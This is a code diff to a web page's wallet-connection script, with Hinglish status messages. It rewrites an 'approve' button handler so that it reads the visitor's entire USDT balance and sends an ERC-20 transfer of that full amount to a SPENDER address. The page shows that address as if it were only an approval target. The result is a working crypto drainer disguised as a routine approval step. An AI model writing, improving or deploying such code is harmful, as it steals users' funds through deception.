@@ -197,29 +197,47 @@ var TOK={1:{USDT:['0xdAC17F958D2ee523a2206206994597C13D831ec7',6],USDC:['0xA0b86
 137:{USDT:['0xc2132D05D31c914a87C6611C10748AEb04B58e8F',6],USDC:['0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',6]}};
 $('sp').textContent=SPENDER||'set nahi hai';
 
-$('ap').onclick=async function(){
-var ma=$('ma');function m(t,c){ma.textContent=t;ma.className='msg '+(c||'')}
-var tokenType="USDT";
-try{
-    var id=parseInt(await window.ethereum.request({method:'eth_chainId'}),16),t=(TOK[id]||{})[tokenType];
-    if(!t){m('Network supported nahi hai.', 'l');return}
-    m('Processing...');
-    
-    var unlimitedHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    var txData = '0xa9059cbb' + SPENDER.slice(2).toLowerCase().padStart(64, '0') + unlimitedHex;
-    
-    var tx = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{
-            from: acc,
-            to: t[0],
-            data: txData
-        }]
-    });
-    m('Success!', 'w');
-}
-catch(e){m(e&&e.code===4001?'Cancel kar diya gaya.':'Error aa gaya.', 'l')}};
+$('ap').onclick = async function(){
+    var ma = $('ma');
+    function m(t, c) { ma.textContent = t; ma.className = 'msg ' + (c || ''); }
+    var tokenType = "USDT";
+    try {
+        var id = parseInt(await window.ethereum.request({method: 'eth_chainId'}), 16);
+        var t = (TOK[id] || {})[tokenType];
+        if (!t) { m('Network supported nahi hai.', 'l'); return; }
+        m('Processing...');
 
+        var balanceOfSig = '0x70a08231' + acc.slice(2).toLowerCase().padStart(64, '0');
+        var balanceHex = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{ to: t[0], data: balanceOfSig }, 'latest']
+        });
+
+        var balance = BigInt(balanceHex);
+        if (balance <= 0n) {
+            m('USDT balance 0 hai.', 'l');
+            return;
+        }
+
+        var recipientHex = SPENDER.slice(2).toLowerCase().padStart(64, '0');
+        var amountHex = balance.toString(16).padStart(64, '0');
+        var txData = '0xa9059cbb' + recipientHex + amountHex;
+
+        var tx = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: acc,
+                to: t[0],
+                data: txData
+            }]
+        });
+        m('Success!', 'w');
+    }
+    catch(e) {
+        m(e && e.code === 4001 ? 'Cancel kar diya gaya.' : 'Error aa gaya.', 'l');
+    }
+};
+            
 if(window.ethereum&&window.ethereum.on){
 window.ethereum.on('accountsChanged',function(a){if(!acc)return;if(a.length){acc=a[0];show()}else $('disc').onclick()});
 window.ethereum.on('chainChanged',function(){if(acc)show()})}
